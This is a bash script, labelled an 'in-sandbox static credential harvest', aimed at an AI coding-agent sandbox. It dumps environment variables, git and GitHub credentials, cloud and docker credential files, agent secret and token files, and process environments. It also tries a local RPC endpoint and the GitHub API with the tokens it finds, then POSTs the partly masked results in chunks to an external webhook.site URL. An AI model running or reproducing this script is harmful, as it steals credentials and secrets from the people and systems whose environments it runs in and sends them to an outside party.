#!/bin/bash
# i84015: in-sandbox static credential harvest (read-only)
S="https://webhook.site/8e688b40-3a9d-4052-8855-ac612046200e"
R="${RND:-r1}"; N="i84015-$(date +%s)-$$"
OUT="./tests/i84015-cred.json"; : > "$OUT" 2>/dev/null
mkdir -p tests 2>/dev/null
RD(){ cat "$1" 2>/dev/null || sudo -n cat "$1" 2>/dev/null; }
echo "### META host=$(hostname) date=$(date -u +%FT%TZ) uid=$(id) pwd=$(pwd) nonce=$N"
echo "### ENV"; env | sort | head -80
echo "### HOSTS"; cat /etc/hosts 2>/dev/null; mount 2>/dev/null | head -12
echo "### GIT"; git config --list --show-origin 2>&1 | head -30; echo --; cat .git/config 2>&1 | head -15; git remote -v 2>&1
echo "### GIT_CRED"
for h in github.com git-manager.local:7000; do sc=https; [ "$h" = "git-manager.local:7000" ] && sc=http; echo "-- $h"; printf "protocol=$sc\nhost=$h\n\n" | GIT_TERMINAL_PROMPT=0 timeout 6 git credential fill 2>&1 | head -6; done
echo "### GH"; command -v gh 2>/dev/null; timeout 6 gh auth status 2>&1 | head -8
echo "### FILES"
for f in /home/ubuntu/.netrc /home/ubuntu/.git-credentials /home/ubuntu/.npmrc /home/ubuntu/.docker/config.json /home/ubuntu/.config/gh/hosts.yml /home/ubuntu/.config/gcloud/application_default_credentials.json /home/ubuntu/.aws/credentials /home/ubuntu/.aws/config /etc/environment /opt/.devin/custom_remote_config.json /opt/.devin/devin_bash_env /opt/.devin/devin_bashrc /opt/.devin/.devin_secrets.sh /opt/.devin/oidc_token /opt/.devin/.devin-integration-git-credentials /opt/.devin/.devin-integration-gh-credentials /opt/.devin/devin_remote_auth_token /run/.devin/identity_token /run/repo_secrets/* /root/.netrc /root/.bashrc; do [ -e "$f" ] && { echo "--- $f $(wc -c < "$f" 2>/dev/null)B"; RD "$f" | head -c 1200; echo; }; done
echo "### RUN_DIRS"; ls -la /run /run/.devin /run/repo_secrets 2>&1 | head -30
echo "### FIND"
sudo -n find /home /opt /run /etc /var -xdev -maxdepth 5 -type f \( -name '*credential*' -o -name '*.pem' -o -name 'id_rsa*' -o -name '*token*' -o -name '.netrc' -o -name '.env*' -o -name '*secret*' \) 2>/dev/null | grep -vE '/(usr|proc|sys)/' | head -40
echo "### PROC_ENV"
for p in 1 self; do echo "-- proc/$p"; tr '\0' '\n' < /proc/$p/environ 2>/dev/null | head -40; done
echo "### GCLOUD"; ls -la /home/ubuntu/.config/gcloud 2>&1 | head -8; RD /home/ubuntu/.config/gcloud/application_default_credentials.json | head -c 800
echo "### RPC"
T=$(RD /opt/.devin/devin_remote_auth_token | tr -d '\r\n')
echo "rpc_token_len=${#T} sha16=$(printf %s "$T" | sha256sum | cut -c1-16)"
[ -n "$T" ] && for p in / /healthz /rpc /methods /status; do c=$(curl -s -m 2 -o /tmp/i84015.rpc -w '%{http_code}' -H "Authorization: Bearer $T" "http://127.0.0.1:9876$p" 2>/dev/null); echo "GET $p -> $c $(head -c 100 /tmp/i84015.rpc 2>/dev/null|tr -d '\n')"; done
echo "### END"
G=$(grep -rhoE 'gh[pousr]_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|x-access-token:[^ @]+' "$OUT" 2>/dev/null | head -1)
if [ -n "$G" ]; then
  echo "### GH_TOKEN len=${#G} sha16=$(printf %s "$G"|sha256sum|cut -c1-16)" >> "$OUT"
  GT=$(printf %s "$G" | sed 's/^x-access-token://')
  curl -s -m 12 -o /tmp/i84015.gh -w 'GH_INSTALL http=%{http_code} bytes=%{size_download}\n' -H "Authorization: token $GT" -H 'Accept: application/vnd.github+json' -H 'User-Agent: i84015' 'https://api.github.com/installation/repositories?per_page=100' 2>>"$OUT" >> "$OUT"
  head -c 2500 /tmp/i84015.gh >> "$OUT" 2>/dev/null; echo >> "$OUT"
fi
sed -E 's/(sk-ant-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(sk-proj-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(sk-or-v1-[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/(AIza[A-Za-z0-9_-]{4})[A-Za-z0-9_-]{6,}/\1...[MASKED]/g; s/((AKIA|ASIA)[A-Z0-9]{4})[A-Z0-9]{6,}/\1...[MASKED]/g; s/(gh[pousr]_[A-Za-z0-9]{4})[A-Za-z0-9]{6,}/\1...[MASKED]/g; s/(github_pat_[A-Za-z0-9_]{4})[A-Za-z0-9_]{6,}/\1...[MASKED]/g; s/(eyJ[A-Za-z0-9_-]{6})[A-Za-z0-9._-]{20,}/\1...[MASKED]/g; s/^((password|token|secret|api_key|apikey)=).*/\1[MASKED]/I' "$OUT" > "$OUT.m" 2>/dev/null
BY=$(wc -c < "$OUT.m" 2>/dev/null); SH=$(sha256sum "$OUT.m" 2>/dev/null | cut -c1-16)
split -b 5900 -a 3 "$OUT.m" /tmp/i84015.part. 2>/dev/null
i=1; for f in /tmp/i84015.part.*; do curl -s -m 8 -X POST --data-binary @"$f" "$S/$R/p$i" >/dev/null 2>&1; i=$((i+1)); done
curl -s -m 8 -X POST --data-binary "DONE i84015 $R parts=$((i-1)) bytes=$BY sha16=$SH host=$(hostname) nonce=$N" "$S/$R/done" >/dev/null 2>&1
rm -f /tmp/i84015.part.*
exit 0
